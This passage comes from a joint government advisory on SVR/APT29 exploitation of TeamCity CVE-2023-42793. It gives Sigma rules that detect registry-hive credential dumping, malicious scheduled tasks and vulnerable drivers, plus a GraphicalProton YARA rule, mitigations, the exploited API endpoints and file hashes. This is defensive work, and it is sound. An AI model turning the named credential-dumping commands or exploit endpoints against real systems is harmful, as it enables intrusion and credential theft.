filedescription: Sensitive registry entries saved to fileauthor:\u00a0references:date: 2023/11/15logsource:\u00a0 \u00a0 category: process_creation\u00a0 \u00a0 product: windowsdetection:\u00a0 \u00a0 selection_base:\u00a0 \u00a0 \u00a0 \u00a0 Image|endswith:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'reg.exe'\u00a0 \u00a0 \u00a0 \u00a0 CommandLine|contains: 'save'\u00a0 \u00a0 \u00a0 \u00a0 CommandLine|re: '.*HKLM\\\\SYSTEM.*|.*HKLM\\\\SECURITY.*|.*HKLM\\\\SAM.*'\u00a0 \u00a0 selection_file:\u00a0 \u00a0 \u00a0 CommandLine|re: '.*sy\\.sa.*|.*sam\\.sa.*|.*se\\.sa.*'\u00a0 \u00a0 condition: selection_base and selection_file\ntitle: Scheduled tasks names used by SVR for GraphicalProton backdoordescription: Hunts for known SVR-specific scheduled task namesauthor:\u00a0references:\u00a0date: 2023/11/15logsource:\u00a0 \u00a0 category: taskscheduler\u00a0 \u00a0 product: windowsdetection:\u00a0 \u00a0 selection:\u00a0 \u00a0 \u00a0 \u00a0 EventID:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 4698\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 4699\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 4702\u00a0 \u00a0 \u00a0 \u00a0 TaskName:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\Microsoft\\Windows\\IISUpdateService'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\Microsoft\\Windows\\WindowsDefenderService'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\Microsoft\\Windows\\WindowsDefenderService2'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\Microsoft\\DefenderService'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\Microsoft\\Windows\\DefenderUPDService'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\Microsoft\\Windows\\WiMSDFS'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\Microsoft\\Windows\\Application Experience\\StartupAppTaskCkeck'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\Microsoft\\Windows\\Windows Error Reporting\\SubmitReporting'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\Microsoft\\Windows\\Windows Defender\\Defender Update Service'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\WindowUpdate'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\Microsoft\\Windows\\Windows Error Reporting\\CheckReporting'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\Microsoft\\Windows\\Application Experience\\StartupAppTaskCheck'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\Microsoft\\Windows\\Speech\\SpeechModelInstallTask'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\Microsoft\\Windows\\Windows Filtering Platform\\BfeOnServiceStart'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\Microsoft\\Windows\\Data Integrity Scan\\Data Integrity Update'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled AutoCheck'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\Microsoft\\Windows\\ATPUpd'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\Microsoft\\Windows\\Windows Defender\\Service Update'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Check'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled AutoCheck'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\Defender'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\defender'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\\\Microsoft\\\\Windows\\\\IISUpdateService'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\\\Microsoft\\\\Windows\\\\WindowsDefenderService'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\\\Microsoft\\\\Windows\\\\WindowsDefenderService2'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\\\Microsoft\\\\DefenderService'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\\\Microsoft\\\\Windows\\\\DefenderUPDService'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\\\Microsoft\\\\Windows\\\\WiMSDFS'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\\\Microsoft\\\\Windows\\\\Application Experience\\\\StartupAppTaskCkeck'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\SubmitReporting'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Defender Update Service'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\\\WindowUpdate'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\CheckReporting'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\\\Microsoft\\\\Windows\\\\Application Experience\\\\StartupAppTaskCheck'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\\\Microsoft\\\\Windows\\\\Speech\\\\SpeechModelInstallTask'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\\\Microsoft\\\\Windows\\\\Windows Filtering Platform\\\\BfeOnServiceStart'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\\\Microsoft\\\\Windows\\\\Data Integrity Scan\\Data Integrity Update'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled AutoCheck'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\\\Microsoft\\\\Windows\\\\ATPUpd'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Service Update'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled Check'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled AutoCheck'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\\\Defender'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '\\\\defender'\u00a0 \u00a0 condition: selection\ntitle: Scheduled tasks names used by SVR for GraphicalProton backdoordescription: Hunts for known SVR-specific scheduled task namesauthor:\u00a0references:date: 2023/11/15logsource:\u00a0 \u00a0 category: process_creation\u00a0 \u00a0 product: windowsdetection:\u00a0 \u00a0 selection:\u00a0 \u00a0 \u00a0 \u00a0 Image|endswith:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'schtasks.exe'\u00a0 \u00a0 \u00a0 \u00a0 CommandLine|contains:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'IISUpdateService'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'WindowsDefenderService'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'WindowsDefenderService2'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'DefenderService'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'DefenderUPDService'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'WiMSDFS'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'StartupAppTaskCkeck'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'SubmitReporting'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'Defender Update Service'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'WindowUpdate'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'CheckReporting'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'StartupAppTaskCheck'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'SpeechModelInstallTask'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'BfeOnServiceStart'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'Data Integrity Update'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'Scheduled AutoCheck'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'ATPUpd'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'Service Update'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'Scheduled Check'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'Scheduled AutoCheck'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'Defender'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'defender'\u00a0 \u00a0 selection_re:\u00a0 \u00a0 \u00a0 \u00a0 Image|endswith:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'schtasks.exe'\u00a0 \u00a0 \u00a0 \u00a0 CommandLine|re:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '.*Defender\\sUpdate\\sService.*'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '.*Data\\sIntegrity\\sUpdate.*'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '.*Scheduled\\sAutoCheck.*'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '.*Service\\sUpdate.*'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '.*Scheduled\\sCheck.*'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '.*Scheduled\\sAutoCheck.*'\u00a0 \u00a0 condition: selection or selection_re\ntitle: Suspicious registry modificationsdescription: Suspicious registry modificationsauthor:\u00a0references:date: 2023/11/15logsource:\u00a0 \u00a0 category: registry_set\u00a0 \u00a0 product: windowsdetection:\u00a0 \u00a0 selection:\u00a0 \u00a0 \u00a0 \u00a0 EventID: 4657\u00a0 \u00a0 \u00a0 \u00a0 TargetObject|contains:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'CurrentControlSet\\\\Control\\\\Lsa\\\\DisableRestrictedAdmin'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'CurrentControlSet\\\\Control\\\\Lsa\\\\NoLMHash'\u00a0 \u00a0 condition: selection\ntitle: Registry modification from cmddescription: Registry modification from cmdauthor:\u00a0references:date: 2023/11/15logsource:\u00a0 \u00a0 category: process_creation\u00a0 \u00a0 product: windowsdetection:\u00a0 \u00a0 selection:\u00a0 \u00a0 \u00a0 \u00a0 Image|endswith:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'reg.exe'\u00a0 \u00a0 \u00a0 \u00a0 CommandLine|contains|all:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'CurrentControlSet'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'Lsa'\u00a0 \u00a0 \u00a0 \u00a0 CommandLine|contains:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'DisableRestrictedAdmin'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'NoLMHash'\u00a0 \u00a0 condition: selection\ntitle: Malicious Driver Loaddescription: Detects the load of known malicious drivers via their names or hash.references:\u00a0 \u00a0 - https://github.com/wavestone-cdt/EDRSandblast#edr-drivers-and-processes-detectionauthor:\u00a0date: 2023/11/15logsource:\u00a0 \u00a0 category: driver_load\u00a0 \u00a0 product: windowsdetection:\u00a0 \u00a0 selection_name:\u00a0 \u00a0 \u00a0 \u00a0 ImageLoaded|endswith:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'RTCore64.sys'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - 'DBUtils_2_3.sys'\u00a0 \u00a0 selection_hash:\u00a0 \u00a0 \u00a0 \u00a0 Hashes|contains:\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd'\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 - '0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5'\u00a0 \u00a0 condition: selection_name or selection_hash\n\n\n\n\nYARA rules\nThe following rule detects most known GraphicalProton variants.\n\n\n\n\nrule APT29_GraphicalProton {\u00a0 \u00a0 strings:\u00a0 \u00a0 \u00a0 \u00a0 // C1 E9 1B \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0shr \u00a0 \u00a0 ecx, 1Bh\u00a0 \u00a0 \u00a0 \u00a0 // 48 8B 44 24 08 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0mov \u00a0 \u00a0 rax, [rsp+30h+var_28]\u00a0 \u00a0 \u00a0 \u00a0 // 8B 50 04 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0mov \u00a0 \u00a0 edx, [rax+4]\u00a0 \u00a0 \u00a0 \u00a0 // C1 E2 05 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0shl \u00a0 \u00a0 edx, 5\u00a0 \u00a0 \u00a0 \u00a0 // 09 D1 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 or \u00a0 \u00a0 \u00a0ecx, edx\u00a0 \u00a0 \u00a0 \u00a0 // 48 8B 44 24 08 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0mov \u00a0 \u00a0 rax, [rsp+30h+var_28]\u00a0 \u00a0 \u00a0 \u00a0 $op_string_crypt = { c1 e? (1b | 18 | 10 | 13 | 19 | 10) 48 [4] 8b [2] c1 e? (05 | 08 | 10 | 0d | 07) 09 ?? 48 }\n\u00a0 \u00a0 \u00a0 \u00a0 // 48 05 20 00 00 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 add \u00a0 \u00a0 rax, 20h ; ' '\u00a0 \u00a0 \u00a0 \u00a0 // 48 89 C1 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0mov \u00a0 \u00a0 rcx, rax\u00a0 \u00a0 \u00a0 \u00a0 // 48 8D 15 0A A6 0D 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0lea \u00a0 \u00a0 rdx, unk_14011E546\u00a0 \u00a0 \u00a0 \u00a0 // 41 B8 30 00 00 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 mov \u00a0 \u00a0 r8d, 30h ; '0'\u00a0 \u00a0 \u00a0 \u00a0 // E8 69 B5 FE FF \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0call \u00a0 \u00a0sub_14002F4B0\u00a0 \u00a0 \u00a0 \u00a0 // 48 8B 44 24 30 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0mov \u00a0 \u00a0 rax, [rsp+88h+var_58]\u00a0 \u00a0 \u00a0 \u00a0 // 48 05 40 00 00 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 add \u00a0 \u00a0 rax, 40h ; '@'\u00a0 \u00a0 \u00a0 \u00a0 // 48 89 C1 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0mov \u00a0 \u00a0 rcx, rax\u00a0 \u00a0 \u00a0 \u00a0 // 48 8D 15 1B A6 0D 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0lea \u00a0 \u00a0 rdx, unk_14011E577\u00a0 \u00a0 \u00a0 \u00a0 // 41 B8 70 01 00 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 mov \u00a0 \u00a0 r8d, 170h\u00a0 \u00a0 \u00a0 \u00a0 // E8 49 B5 FE FF \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0call \u00a0 \u00a0sub_14002F4B0\u00a0 \u00a0 \u00a0 \u00a0 // 48 8B 44 24 30 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0mov \u00a0 \u00a0 rax, [rsp+88h+var_58]\u00a0 \u00a0 \u00a0 \u00a0 // 48 05 60 00 00 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 add \u00a0 \u00a0 rax, 60h ; '`'\u00a0 \u00a0 \u00a0 \u00a0 // 48 89 C1 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0mov \u00a0 \u00a0 rcx, rax\u00a0 \u00a0 \u00a0 \u00a0 // 48 8D 15 6C A7 0D 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0lea \u00a0 \u00a0 rdx, unk_14011E6E8\u00a0 \u00a0 \u00a0 \u00a0 // 41 B8 2F 00 00 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 mov \u00a0 \u00a0 r8d, 2Fh ; '/'\u00a0 \u00a0 \u00a0 \u00a0 // E8 29 B5 FE FF \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0call \u00a0 \u00a0sub_14002F4B0\u00a0 \u00a0 \u00a0 \u00a0 // 48 8B 44 24 30 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0mov \u00a0 \u00a0 rax, [rsp+88h+var_58]\u00a0 \u00a0 \u00a0 \u00a0 // 48 05 80 00 00 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 add \u00a0 \u00a0 rax, 80h\u00a0 \u00a0 \u00a0 \u00a0 // 48 89 C1 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0mov \u00a0 \u00a0 rcx, rax\u00a0 \u00a0 \u00a0 \u00a0 // 48 8D 15 7C A7 0D 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0lea \u00a0 \u00a0 rdx, unk_14011E718\u00a0 \u00a0 \u00a0 \u00a0 // 41 B8 2F 00 00 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 mov \u00a0 \u00a0 r8d, 2Fh ; '/'\u00a0 \u00a0 \u00a0 \u00a0 // E8 09 B5 FE FF \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0call \u00a0 \u00a0sub_14002F4B0\u00a0 \u00a0 \u00a0 \u00a0 // 48 8B 44 24 30 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0mov \u00a0 \u00a0 rax, [rsp+88h+var_58]\u00a0 \u00a0 \u00a0 \u00a0 // 48 05 A0 00 00 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 add \u00a0 \u00a0 rax, 0A0h\u00a0 \u00a0 \u00a0 \u00a0 $op_decrypt_config = {\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 48 05 20 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 48 05 40 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 48 05 60 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 48 05 80 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 48 05 A0 00 00 00\u00a0 \u00a0 \u00a0 \u00a0 }\n\u00a0 \u00a0 condition:\u00a0 \u00a0 \u00a0 \u00a0 all of them}\n\n\n\n\nNote: These rules are meant for threat hunting and have not been tested on a larger dataset.\nMITIGATIONS\nThe FBI, CISA, NSA, SKW, CERT Polska, and NCSC assess the scope and indiscriminate targeting of this campaign poses a threat to public safety and recommend organizations implement the mitigations below to improve organization\u2019s cybersecurity posture. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA\u2019s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.\n\nApply available patches for CVE-2023-42793 issued by JetBrains TeamCity in mid-September 2023, if not already completed.\nMonitor the network for evidence of encoded commands and execution of network scanning tools.\nEnsure host-based anti-virus/endpoint monitoring solutions are enabled and set to alert if monitoring or reporting is disabled, or if communication is lost with a host agent for more than a reasonable amount of time.\nRequire use of multi-factor authentication [CPG 1.3] for all services to the extent possible, particularly for email, virtual private networks, and accounts that access critical systems.\n\nOrganizations should adopt multi-factor authentication (MFA) as an additional layer of security for all users with access to sensitive data. Enabling MFA significantly reduces the risk of unauthorized access, even if passwords are compromised.\n\n\nKeep all operating systems, software, and firmware up to date. Immediately configure newly-added systems to the network, including those used for testing or development work, to follow the organization\u2019s security baseline and incorporate into enterprise monitoring tools.\nAudit log files to identify attempts to access privileged certificates and creation of fake identity providers.\nDeploy software to identify suspicious behavior on systems.\nDeploy endpoint protection systems with the ability to monitor for behavioral indicators of compromise.\nUse available public resources to identify credential abuse with cloud environments.\nConfigure authentication mechanisms to confirm certain user activities on systems, including registering new devices.\n\nVALIDATE SECURITY CONTROLS\nIn addition to applying mitigations, FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.\nTo get started:\n\nSelect an ATT&CK technique described in this advisory (see previous tables).\nAlign your security technologies against the technique.\nTest your technologies against the technique.\nAnalyze your detection and prevention technologies\u2019 performance.\nRepeat the process for all security technologies to obtain a set of comprehensive performance data.\nTune your security program, including people, processes, and technologies, based on the data generated by this process.\n\nFBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.\nREFERENCES\n\nFBI, DHS, CISA, Joint Cyber Security Advisory, Russian Foreign Intelligence Service (SVR) Cyber Operations: Trends and Best Practices for Network Defenders\nNSA, CISA, FBI, Joint Cyber Security Advisory, Russian SVR Targets U.S. and Allied Networks\nCISA, Remediating Networks Affected by the Solarwinds and Active Directory/M365 Compromise\nCISA, Alert (AA21-008A), Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments\nCISA, Alert (AA20-352A), Advanced Persistent Threat Compromise of Government Agencies, Critical Infrastructure, and Private Sector Organizations\nCISA, CISA Insights, What Every Leader Needs to Know About the Ongoing APT Cyber Activity\nFBI, CISA, Joint Cybersecurity Advisory, Advanced Persistent Threat Actors Targeting U.S. Think Tanks\nCISA, Malicious Activity Targeting COVID-19 Research, Vaccine Development\nNCSC, CSE, NSA, CISA, Advisory: APT 29 Targets COVID-19 Vaccine Development\n\nThe information in this report is being provided \u201cas is\u201d for informational purposes only. FBI, CISA, NSA, SKW, CERT Polska, and NCSC do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, NSA, SKW, CERT Polska, and NCSC.\nVERSION HISTORY\nDecember 12, 2023: Initial version.\nAPPENDIX A \u2013 INDICATORS OF COMPROMISE CVE-2023-42793\nOn a Windows system, the log file C:\\TeamCity\\logs\\teamcity-server.log will contain a log message when an attacker modified the internal.properties file. There will also be a log message for every process created via the /app/rest/debug/processes endpoint. In addition to showing the command line used, the user ID of the user account whose authentication token was used during the attack is also shown. For example:\n[2023-09-26 11:53:46,970] \u00a0 INFO - ntrollers.FileBrowseController - File edited: C:\\ProgramData\\JetBrains\\TeamCity\\config\\internal.properties by user with id=1[2023-09-26 11:53:46,970] \u00a0 INFO - s.buildServer.ACTIVITIES.AUDIT - server_file_change: File C:\\ProgramData\\JetBrains\\TeamCity\\config\\internal.properties was modified by \"user with id=1\"[2023-09-26 11:53:58,227] \u00a0 INFO - tbrains.buildServer.ACTIVITIES - External process is launched by user user with id=1. Command line: cmd.exe \"/c whoami\"\nAn attacker may attempt to cover their tracks by wiping this log file. It does not appear that TeamCity logs individual HTTP requests, but if TeamCity is configured to sit behind a HTTP proxy, the HTTP proxy may have suitable logs showing the following target endpoints being accessed:\n\n/app/rest/users/id:1/tokens/RPC2 \u2013 This endpoint is required to exploit the vulnerability.\n/app/rest/users \u2013 This endpoint is only required if the attacker wishes to create an arbitrary user.\n/app/rest/debug/processes \u2013 This endpoint is only required if the attacker wishes to create an arbitrary process.\n\nNote: The user ID value may be higher than 1.\nAPPENDIX B \u2013 IOCS\nFile IoCs\nGraphicalProton backdoor:\n\n01B5F7094DE0B2C6F8E28AA9A2DED678C166D615530E595621E692A9C0240732\n34C8F155601A3948DDB0D60B582CFE87DE970D443CC0E05DF48B1A1AD2E42B5E\n620D2BF14FE345EEF618FDD1DAC242B3A0BB65CCB75699FE00F7C671F2C1D869\n773F0102720AF2957859D6930CD09693824D87DB705B3303CEF9EE794375CE13\n7B666B978DBBE7C032CEF19A90993E8E4922B743EE839632BFA6D99314EA6C53\n8AFB71B7CE511B0BCE642F46D6FC5DD79FAD86A58223061B684313966EFEF9C7\n971F0CED6C42DD2B6E3EA3E6C54D0081CF9B06E79A38C2EDE3A2C5228C27A6DC\nCB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF\nCD3584D61C2724F927553770924149BB51811742A461146B15B34A26C92CAD43\nEBE231C90FAD02590FC56D5840ACC63B90312B0E2FEE7DA3C7606027ED92600E\nF1B40E6E5A7CBC22F7A0BD34607B13E7E3493B8AAD7431C47F1366F0256E23EB\nC7B01242D2E15C3DA0F45B8ADEC4E6913E534849CDE16A2A6C480045E03FBEE4\n4BF1915785D7C6E0987EB9C15857F7AC67DC365177A1707B14822131D43A6166\n\nGraphicalProton HTTPS backdoor:\n\n18101518EAE3EEC6EBE453DE4C4C380160774D7C3ED5C79E1813013AC1BB0B93\n19F1EF66E449CF2A2B0283DBB756850CCA396114286E1485E35E6C672C9C3641\n1E74CF0223D57FD846E171F4A58790280D4593DF1F23132044076560A5455FF8\n219FB90D2E88A2197A9E08B0E7811E2E0BD23D59233287587CCC4642C2CF3D67\n92C7693E82A90D08249EDEAFBCA6533FED81B62E9E056DEC34C24756E0A130A6\nB53E27C79EED8531B1E05827ACE2362603FB9F77F53CEE2E34940D570217CBF7\nC37C109171F32456BBE57B8676CC533091E387E6BA733FBAA01175C43CFB6EBD\nC40A8006A7B1F10B1B42FDD8D6D0F434BE503FB3400FB948AC9AB8DDFA5B78A0\nC832462C15C8041191F190F7A88D25089D57F78E97161C3003D68D0CC2C4BAA3\nF6194121E1540C3553273709127DFA1DAAB96B0ACFAB6E92548BFB4059913C69\n\nBackdoored 